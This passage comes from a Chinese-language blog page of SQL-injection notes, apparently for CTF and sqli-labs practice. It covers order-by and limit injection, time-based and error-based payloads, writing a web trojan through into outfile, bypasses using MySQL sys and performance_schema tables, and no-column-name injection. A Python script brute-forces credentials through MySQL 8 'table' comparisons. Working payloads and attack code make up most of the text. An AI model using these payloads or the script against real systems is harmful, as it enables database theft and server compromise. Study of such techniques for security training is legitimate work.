?sort&#x3D;rand(sql语句)</p><ul><li>利用的是rand(true)与rand(false)导致题目回显不同而构造盲注条件</li></ul><p>也可以用报错注入</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?sort<span class="hljs-operator">=</span>(<span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>) <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> concat(<span class="hljs-number">0x3a</span>,<span class="hljs-number">0x3a</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>()),<span class="hljs-number">0x3a</span>,<span class="hljs-number">0x3a</span>,<span class="hljs-built_in">floor</span>(rand()<span class="hljs-operator">*</span><span class="hljs-number">2</span>)))<br></code></pre></td></tr></table></figure></li><li><p>利用and ?sort&#x3D;1 and(sql语句)</p><ul><li>这里的sql语句可以用延时注入</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?sort<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> If(ascii(substr(database(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))<span class="hljs-operator">=</span><span class="hljs-number">116</span>,<span class="hljs-number">0</span>,sleep(<span class="hljs-number">5</span>))<br></code></pre></td></tr></table></figure></li></ul><h3 id="procedure-analyse-参数后注入"><a href="#procedure-analyse-参数后注入" class="headerlink" title="procedure analyse 参数后注入"></a>procedure analyse 参数后注入</h3><p>此方法适用于MySQL 5.x中，在limit语句后面的注入 利用procedure analyse 参数，我们可以执行报错注入。</p><p>同时，在procedure analyse 和order by 之间可以存在limit 参数，我们在实际应用中，往往也可能会存在limit 后的注入，可以利用procedure analyse 进行注入</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql">http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span><span class="hljs-operator">/</span>sqli<span class="hljs-operator">-</span>labs<span class="hljs-operator">/</span>Less<span class="hljs-number">-46</span><span class="hljs-operator">/</span>?sort<span class="hljs-operator">=</span><span class="hljs-number">1</span>  <span class="hljs-keyword">procedure</span> analyse(extractvalue(rand(),con<br>cat(<span class="hljs-number">0x3a</span>,version())),<span class="hljs-number">1</span>)<br><span class="hljs-keyword">SELECT</span> field <span class="hljs-keyword">FROM</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">WHERE</span> id <span class="hljs-operator">&gt;</span><span class="hljs-number">0</span> <span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> id LIMIT <span class="hljs-number">1</span>,<span class="hljs-number">1</span> <span class="hljs-keyword">procedure</span> analyse(extractvalue(rand(),concat(<span class="hljs-number">0x3a</span>,version())),<span class="hljs-number">1</span>); <br># 如果不支持报错注入的话，还可以基于时间注入：<br><span class="hljs-keyword">SELECT</span> field <span class="hljs-keyword">FROM</span> <span class="hljs-keyword">table</span> <span class="hljs-keyword">WHERE</span> id <span class="hljs-operator">&gt;</span> <span class="hljs-number">0</span> <span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> id LIMIT <span class="hljs-number">1</span>,<span class="hljs-number">1</span> <span class="hljs-keyword">PROCEDURE</span> analyse((<span class="hljs-keyword">select</span> extractvalue(rand(),concat(<span class="hljs-number">0x3a</span>,(IF(MID(version(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>) <span class="hljs-keyword">LIKE</span> <span class="hljs-number">5</span>, BENCHMARK(<span class="hljs-number">5000000</span>,SHA1(<span class="hljs-number">1</span>)),<span class="hljs-number">1</span>))))),<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure><h3 id="导入导出文件into-outfile-参数"><a href="#导入导出文件into-outfile-参数" class="headerlink" title="导入导出文件into outfile 参数"></a>导入导出文件into outfile 参数</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sql">http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span><span class="hljs-operator">/</span>sqli<span class="hljs-operator">-</span>labs<span class="hljs-operator">/</span>Less<span class="hljs-number">-46</span><span class="hljs-operator">/</span>?sort<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">into</span> outfile &quot;c:\\wamp\\www\\sqllib\\test<br>1.txt&quot;<br># 将查询结果导入到文件当中<br># 那这个时候我们可以考虑上传网马，利用lines terminated <span class="hljs-keyword">by</span><br><span class="hljs-keyword">Into</span> outtfile c:\\wamp\\www\\sqllib\\test1.txt lines terminated <span class="hljs-keyword">by</span> <span class="hljs-number">0</span>x(网马进行<span class="hljs-number">16</span> 进制转<br>换)<br></code></pre></td></tr></table></figure><h2 id="六、常见bypass"><a href="#六、常见bypass" class="headerlink" title="六、常见bypass"></a>六、常见bypass</h2><p><a href="http://byd.dropsec.xyz/2016/08/01/SQL-Injection%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7/">SQL注入绕过技巧 | 瓦都剋 (dropsec.xyz)</a></p><h3 id="Information-schema被屏蔽或过滤or时"><a href="#Information-schema被屏蔽或过滤or时" class="headerlink" title="Information_schema被屏蔽或过滤or时"></a>Information_schema被屏蔽或过滤or时</h3><p><a href="https://www.anquanke.com/post/id/193512">聊一聊bypass information_schema - 安全客，安全资讯平台 (anquanke.com)</a></p><h4 id="MySQL5-7的新特性"><a href="#MySQL5-7的新特性" class="headerlink" title="MySQL5.7的新特性"></a>MySQL5.7的新特性</h4><blockquote><p>由于performance_schema过于发杂，所以mysql在5.7版本中新增了sys schemma，基础数据来自于performance_chema和information_schema两个库，本身数据库不存储数据。</p></blockquote><h4 id="innodb表–查找当前数据库的现存表"><a href="#innodb表–查找当前数据库的现存表" class="headerlink" title="innodb表–查找当前数据库的现存表"></a><strong>innodb表</strong>–查找当前数据库的现存表</h4><p>MySQL 5.6 及以上版本存在innodb_index_stats，innodb_table_stats两张表，其中包含新建立的库和表</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> table_name <span class="hljs-keyword">from</span> mysql.innodb_table_stats <span class="hljs-keyword">where</span> database_name <span class="hljs-operator">=</span> database(); # 返回去重过后的表名(简洁)<br><span class="hljs-keyword">select</span> table_name <span class="hljs-keyword">from</span> mysql.innodb_index_stats <span class="hljs-keyword">where</span> database_name <span class="hljs-operator">=</span> database(); # 返回值中会出现重复的表名<br></code></pre></td></tr></table></figure><h4 id="sys表"><a href="#sys表" class="headerlink" title="sys表"></a>sys表</h4><p>在MySQL 5.7.9中sys中新增了一些视图，可以从中获取表名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs sql">#包含<span class="hljs-keyword">in</span><br><span class="hljs-keyword">SELECT</span> object_name <span class="hljs-keyword">FROM</span> `sys`.`x$innodb_buffer_stats_by_table` <span class="hljs-keyword">where</span> object_schema <span class="hljs-operator">=</span> database();<br><span class="hljs-keyword">SELECT</span> object_name <span class="hljs-keyword">FROM</span> `sys`.`innodb_buffer_stats_by_table` <span class="hljs-keyword">WHERE</span> object_schema <span class="hljs-operator">=</span> DATABASE();<br><span class="hljs-keyword">SELECT</span> TABLE_NAME <span class="hljs-keyword">FROM</span> `sys`.`x$schema_index_statistics` <span class="hljs-keyword">WHERE</span> TABLE_SCHEMA <span class="hljs-operator">=</span> DATABASE();<br><span class="hljs-keyword">SELECT</span> TABLE_NAME <span class="hljs-keyword">FROM</span> `sys`.`schema_auto_increment_columns` <span class="hljs-keyword">WHERE</span> TABLE_SCHEMA <span class="hljs-operator">=</span> DATABASE();<br><span class="hljs-keyword">SELECT</span> table_schema <span class="hljs-keyword">FROM</span> sys.schema_table_statistics <span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> table_schema;<br>#不包含<span class="hljs-keyword">in</span><br><span class="hljs-keyword">SELECT</span> TABLE_NAME <span class="hljs-keyword">FROM</span> `sys`.`x$schema_flattened_keys` <span class="hljs-keyword">WHERE</span> TABLE_SCHEMA <span class="hljs-operator">=</span> DATABASE();<br><span class="hljs-keyword">SELECT</span> TABLE_NAME <span class="hljs-keyword">FROM</span> `sys`.`x$ps_schema_table_statistics_io` <span class="hljs-keyword">WHERE</span> TABLE_SCHEMA <span class="hljs-operator">=</span> DATABASE();<br><span class="hljs-keyword">SELECT</span> TABLE_NAME <span class="hljs-keyword">FROM</span> `sys`.`x$schema_table_statistics_with_buffer` <span class="hljs-keyword">WHERE</span> TABLE_SCHEMA <span class="hljs-operator">=</span> DATABASE();<br><span class="hljs-keyword">SELECT</span> table_schema <span class="hljs-keyword">FROM</span> sys.x$schema_flattened_keys <span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> table_schema;<br>#通过表文件的存储路径获取表名<br><span class="hljs-keyword">SELECT</span> FILE <span class="hljs-keyword">FROM</span> `sys`.`io_global_by_file_by_bytes` <span class="hljs-keyword">WHERE</span> FILE REGEXP DATABASE();<br><span class="hljs-keyword">SELECT</span> FILE <span class="hljs-keyword">FROM</span> `sys`.`io_global_by_file_by_latency` <span class="hljs-keyword">WHERE</span> FILE REGEXP DATABASE();<br><span class="hljs-keyword">SELECT</span> FILE <span class="hljs-keyword">FROM</span> `sys`.`x$io_global_by_file_by_bytes` <span class="hljs-keyword">WHERE</span> FILE REGEXP DATABASE();<br><br>#查询指定库的表（若无则说明此表从未被访问）<br><span class="hljs-keyword">SELECT</span> table_name <span class="hljs-keyword">FROM</span> sys.schema_table_statistics <span class="hljs-keyword">WHERE</span> table_schema<span class="hljs-operator">=</span><span class="hljs-string">&#x27;mspwd&#x27;</span> <span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> table_name;<br><span class="hljs-keyword">SELECT</span> table_name <span class="hljs-keyword">FROM</span> sys.x$schema_flattened_keys <span class="hljs-keyword">WHERE</span> table_schema<span class="hljs-operator">=</span><span class="hljs-string">&#x27;mspwd&#x27;</span> <span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> table_name;<br>#统计所有访问过的表次数:库名,表名,访问次数<br><span class="hljs-keyword">select</span> table_schema,table_name,<span class="hljs-built_in">sum</span>(io_read_requests<span class="hljs-operator">+</span>io_write_requests) io <span class="hljs-keyword">from</span> sys.schema_table_statistics <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span><br>table_schema,table_name <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> io <span class="hljs-keyword">desc</span>;<br>#查看所有正在连接的用户详细信息<br><span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">user</span>,db,command,current_statement,last_statement,<span class="hljs-type">time</span> <span class="hljs-keyword">FROM</span> sys.session;<br>#查看所有曾连接数据库的IP,总连接次数<br><span class="hljs-keyword">SELECT</span> host,total_connections <span class="hljs-keyword">FROM</span> sys.host_summary;<br># 包含之前查询记录的表<br><span class="hljs-keyword">SELECT</span> QUERY <span class="hljs-keyword">FROM</span> sys.x$statement_analysis <span class="hljs-keyword">WHERE</span> QUERY REGEXP DATABASE();<br><span class="hljs-keyword">SELECT</span> QUERY <span class="hljs-keyword">FROM</span> `sys`.`statement_analysis` <span class="hljs-keyword">where</span> QUERY REGEXP DATABASE();<br></code></pre></td></tr></table></figure><h4 id="performance-schema表"><a href="#performance-schema表" class="headerlink" title="performance_schema表"></a>performance_schema表</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> object_name <span class="hljs-keyword">FROM</span> `performance_schema`.`objects_summary_global_by_type` <span class="hljs-keyword">WHERE</span> object_schema <span class="hljs-operator">=</span> DATABASE();<br><span class="hljs-keyword">SELECT</span> object_name <span class="hljs-keyword">FROM</span> `performance_schema`.`table_handles` <span class="hljs-keyword">WHERE</span> object_schema <span class="hljs-operator">=</span> DATABASE();<br><span class="hljs-keyword">SELECT</span> object_name <span class="hljs-keyword">FROM</span> `performance_schema`.`table_io_waits_summary_by_index_usage` <span class="hljs-keyword">WHERE</span> object_schema <span class="hljs-operator">=</span> DATABASE();<br><span class="hljs-keyword">SELECT</span> object_name <span class="hljs-keyword">FROM</span> `performance_schema`.`table_io_waits_summary_by_table` <span class="hljs-keyword">WHERE</span> object_schema <span class="hljs-operator">=</span> DATABASE();<br><span class="hljs-keyword">SELECT</span> object_name <span class="hljs-keyword">FROM</span> `performance_schema`.`table_lock_waits_summary_by_table` <span class="hljs-keyword">WHERE</span> object_schema <span class="hljs-operator">=</span> DATABASE();<br>#包含之前查询记录的表<br><span class="hljs-keyword">SELECT</span> digest_text <span class="hljs-keyword">FROM</span> `performance_schema`.`events_statements_summary_by_digest` <span class="hljs-keyword">WHERE</span> digest_text REGEXP DATABASE();<br>#包含表文件路径的表<br><span class="hljs-keyword">SELECT</span> file_name <span class="hljs-keyword">FROM</span> `performance_schema`.`file_instances` <span class="hljs-keyword">WHERE</span> file_name REGEXP DATABASE();<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202407032232923.jpg" alt="image-20220707221836224"></p><blockquote><p>上诉表格中虽然有能够查列名的表，但是查出来的数据都不全，当知道flag所在的库和表名时，但无法获取到列名，就需要利用无列名盲注了</p></blockquote><h4 id="join无列名注入-payload"><a href="#join无列名注入-payload" class="headerlink" title="join无列名注入 payload"></a>join无列名注入 payload</h4><p><strong>join … using(xx)</strong></p><p>查表名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27;</span><br><span class="hljs-string">?id=-1&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">all</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(table_name)<span class="hljs-keyword">from</span> sys.schema_auto_increment_columns <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span>database()<span class="hljs-comment">--+</span><br><span class="hljs-string">&#x27;</span><br><span class="hljs-string">?id=-1&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">all</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(table_name)<span class="hljs-keyword">from</span> sys.schema_table_statistics_with_buffer <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span>database()<span class="hljs-comment">--+</span><br><span class="hljs-string">&#x27;</span><br><span class="hljs-string">?id=-1&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> group_concat(table_name) <span class="hljs-keyword">from</span> mysql.innodb_table_stats <span class="hljs-keyword">where</span> database_name<span class="hljs-operator">=</span>database()<span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><blockquote><p>Union all 与union 的区别是增加了去重的功能</p></blockquote><p>查列名(适用于逗号被过滤)</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs sql"># <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> 重命名法<br><span class="hljs-keyword">select</span> c <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-number">1</span> <span class="hljs-keyword">as</span> a, <span class="hljs-number">1</span> <span class="hljs-keyword">as</span> b, <span class="hljs-number">1</span> <span class="hljs-keyword">as</span> c <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> test)x limit <span class="hljs-number">1</span> <span class="hljs-keyword">offset</span> <span class="hljs-number">1</span>;<br>#无逗号，有<span class="hljs-keyword">join</span>版本<br><span class="hljs-keyword">select</span> a <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-number">1</span> `a`)m <span class="hljs-keyword">join</span> (<span class="hljs-keyword">select</span> <span class="hljs-number">2</span> `b`)n <span class="hljs-keyword">join</span> (<span class="hljs-keyword">select</span> <span class="hljs-number">3</span> `c`)t <span class="hljs-keyword">where</span> <span class="hljs-number">0</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> test)x;<br><span class="hljs-string">&#x27;</span><br><span class="hljs-string">?id=-1&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">all</span> <span class="hljs-keyword">select</span><span class="hljs-operator">*</span><span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">as</span> a <span class="hljs-keyword">join</span> users b)c<span class="hljs-comment">--+</span><br># 获取第一列的列名<br><span class="hljs-string">&#x27;</span><br><span class="hljs-string">?id=-1&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">all</span> <span class="hljs-keyword">select</span><span class="hljs-operator">*</span><span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">as</span> a <span class="hljs-keyword">join</span> users b <span class="hljs-keyword">using</span>(id,username))c<span class="hljs-comment">--+</span><br># 获取次列及后续列名<br></code></pre></td></tr></table></figure><h4 id="union-select重命名法"><a href="#union-select重命名法" class="headerlink" title="union select重命名法"></a><code>union select重命名法</code></h4><p>不获取列名情况下查列,以查第二列为例</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs SQL"><span class="hljs-keyword">select</span> group_concat(b) <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span> <span class="hljs-keyword">as</span> b,<span class="hljs-number">3</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users)a;<br># 也可以查多个列<br><span class="hljs-keyword">select</span> concat(`<span class="hljs-number">2</span>`,<span class="hljs-number">0x2d</span>,`<span class="hljs-number">3</span>`) <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> admin)a limit <span class="hljs-number">1</span>,<span class="hljs-number">3</span>;<br># <span class="hljs-number">0x2d</span>会转换成字符<span class="hljs-string">&#x27;-&#x27;</span><br></code></pre></td></tr></table></figure><blockquote><p>这里将第二列取别名为b(如果反引号&#96;没被过滤，可以不取别名，直接用⬇️)</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> `<span class="hljs-number">2</span>` <span class="hljs-keyword">from</span> ……<br></code></pre></td></tr></table></figure><p>结尾的a可以替换成任意字符，这是用来命名的</p><p>原理是联合查询时列名显示的是前一个select的结果，这里第一个select是<code>select 1,2 as b,3 </code>将列名重命名为1 b 3，然后再将这个新表命名为a，再进行查询</p></blockquote><h3 id="select被过滤"><a href="#select被过滤" class="headerlink" title="select被过滤"></a>select被过滤</h3><p><a href="https://www.freebuf.com/articles/web/275528.html">基于mysql8特性的sql注入 - FreeBuf网络安全行业门户</a></p><p>mysql 8.0.19<code>新增语句</code>table </p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">table</span> users; <span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span> <span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users;<br></code></pre></td></tr></table></figure><blockquote><p>table不能加where子句，不允许行过滤，显示所有列，但可以用来盲注表名</p></blockquote><h4 id="table盲注脚本"><a href="#table盲注脚本" class="headerlink" title="table盲注脚本"></a>table盲注脚本</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#-*- coding:utf-8 -*-</span><br><span class="hljs-comment">#orio1e</span><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">str2hex</span>(<span class="hljs-params"><span class="hljs-built_in">str</span></span>):<br>result=<span class="hljs-string">&#x27;0x&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">str</span>:<br>result+=<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">ord</span>(i))[<span class="hljs-number">2</span>:]<br><span class="hljs-keyword">return</span> result<br>dic=[<span class="hljs-string">&#x27;0&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>, <span class="hljs-string">&#x27;2&#x27;</span>, <span class="hljs-string">&#x27;3&#x27;</span>, <span class="hljs-string">&#x27;4&#x27;</span>, <span class="hljs-string">&#x27;5&#x27;</span>, <span class="hljs-string">&#x27;6&#x27;</span>, <span class="hljs-string">&#x27;7&#x27;</span>, <span class="hljs-string">&#x27;8&#x27;</span>, <span class="hljs-string">&#x27;9&#x27;</span>, <span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-string">&#x27;b&#x27;</span>, <span class="hljs-string">&#x27;c&#x27;</span>, <span class="hljs-string">&#x27;d&#x27;</span>, <span class="hljs-string">&#x27;e&#x27;</span>, <span class="hljs-string">&#x27;f&#x27;</span>, <span class="hljs-string">&#x27;g&#x27;</span>, <span class="hljs-string">&#x27;h&#x27;</span>, <span class="hljs-string">&#x27;i&#x27;</span>, <span class="hljs-string">&#x27;j&#x27;</span>, <span class="hljs-string">&#x27;k&#x27;</span>, <span class="hljs-string">&#x27;l&#x27;</span>, <span class="hljs-string">&#x27;m&#x27;</span>, <span class="hljs-string">&#x27;n&#x27;</span>, <span class="hljs-string">&#x27;o&#x27;</span>, <span class="hljs-string">&#x27;p&#x27;</span>, <span class="hljs-string">&#x27;q&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>, <span class="hljs-string">&#x27;s&#x27;</span>, <span class="hljs-string">&#x27;t&#x27;</span>, <span class="hljs-string">&#x27;u&#x27;</span>, <span class="hljs-string">&#x27;v&#x27;</span>,<br>         <span class="hljs-string">&#x27;w&#x27;</span>, <span class="hljs-string">&#x27;x&#x27;</span>, <span class="hljs-string">&#x27;y&#x27;</span>, <span class="hljs-string">&#x27;z&#x27;</span>,]  <span class="hljs-comment"># 字典</span><br>result=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">35</span>):<br><span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(dic)):<br><span class="hljs-built_in">print</span>(dic[j])<br>url=<span class="hljs-string">&quot;http://127.0.0.1:8010&quot;</span><br><span class="hljs-comment">#第一个字段</span><br><span class="hljs-comment">#结果:1</span><br>payload=&#123;<span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">&quot;asd\\&quot;</span>,<span class="hljs-string">&quot;password&quot;</span>:<span class="hljs-string">&quot;||(&#123;&#125;,0x21,0x21)&lt;(table/**/admin_user/**/limit/**/1)#&quot;</span>.<span class="hljs-built_in">format</span>(str2hex(result+dic[j]))&#125;<br><span class="hljs-comment">#爆第二个字段</span><br><span class="hljs-comment">#结果:guest</span><br>payload=&#123;<span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">&quot;asd\\&quot;</span>,<span class="hljs-string">&quot;password&quot;</span>:<span class="hljs-string">&quot;||(0x31,&#123;&#125;,0x21)&lt;(table/**/admin_user/**/limit/**/1)#&quot;</span>.<span class="hljs-built_in">format</span>(str2hex(result+dic[j]))&#125;<br><span class="hljs-comment">#爆第三个字段</span><br><span class="hljs-comment">#结果:123456</span><br><span class="hljs-comment">#因为最后一个字符完成后长度相等又判断为假 所以最后一个字符应为其下一个字母</span><br><span class="hljs-comment">#但是这仅限最后一个字段</span><br><span class="hljs-comment">#所以正确结果是we1c0mehacker </span><br>payload=&#123;<span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">&quot;asd\\&quot;</span>,<span class="hljs-string">&quot;password&quot;</span>:<span class="hljs-string">&quot;||(0x31,0x61646d696e,&#123;&#125;)&lt;(table/**/users/**/limit/**/1)#&quot;</span>.<span class="hljs-built_in">format</span>(str2hex(result+dic[j]))&#125;<br><br>res=requests.post(url=url,data=payload)<br><span class="hljs-built_in">print</span>(payload)<br><span class="hljs-built_in">print</span>(res.text[-<span class="hljs-number">20</span>:])<br><span class="hljs-keyword">if</span> <span class="hljs-string">&quot;emmmmm&quot;</span> <span class="hljs-keyword">in</span> res.text:<br><span class="hljs-keyword">continue</span><br><span class="hljs-keyword">elif</span> <span class="hljs-string">&quot;no&quot;</span> <span class="hljs-keyword">in</span> res.text:<br><span class="hljs-comment">#返回假时表示上一个字母即为正确结果</span><br>result+=dic[j-<span class="hljs-number">1</span>]<br><span class="hljs-keyword">break</span><br><br><span class="hljs-built_in">print</span>(result)<br></code></pre></td></tr></table></figure><blockquote><p>注意往前回溯</p><p>mysql比较，从第一个字符还是比较ascii的大小，一次往后 ,并且多列的比较时从第一列的第一位开始的</p><p>mysql中对char型大小写是不敏感的，盲注的时候要么可以使用hex或者binary。</p></blockquote><h4 id="values注入"><a href="#values注入" class="headerlink" title="values注入"></a>values注入</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> `test`.`log`(`log`) <span class="hljs-keyword">VALUES</span>(<span class="hljs-string">&#x27;$log&#x27;</span>);<br><span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> `test`.`log`(`log`) <span class="hljs-keyword">VALUES</span>(<span class="hljs-string">&#x27;testsetset&#x27;</span><span class="hljs-keyword">or</span> sleep(<span class="hljs-number">5</span>)) # <span class="hljs-string">&#x27;);</span><br><span class="hljs-string">insert into `test`.`log`(`log`) VALUES(&#x27;</span>testsetset<span class="hljs-string">&#x27; and extractvalue(1,concat(0x7e,(select @@version),0x7e))) # &#x27;</span>)<br><span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> `test`.`log`(`log`) <span class="hljs-keyword">VALUES</span>(<span class="hljs-string">&#x27;1&#x27;</span><span class="hljs-operator">+</span>if((<span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span>),sleep(<span class="hljs-number">2</span>),<span class="hljs-number">1</span>)) # <span class="hljs-string">&#x27;)</span><br></code></pre></td></tr></table></figure><p>可以利用联合注入代替order by</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202407032232669.jpg" alt="image-20220707223820177"></p><h3 id="WAF绕过–服务器解析漏洞"><a href="#WAF绕过–服务器解析漏洞" class="headerlink" 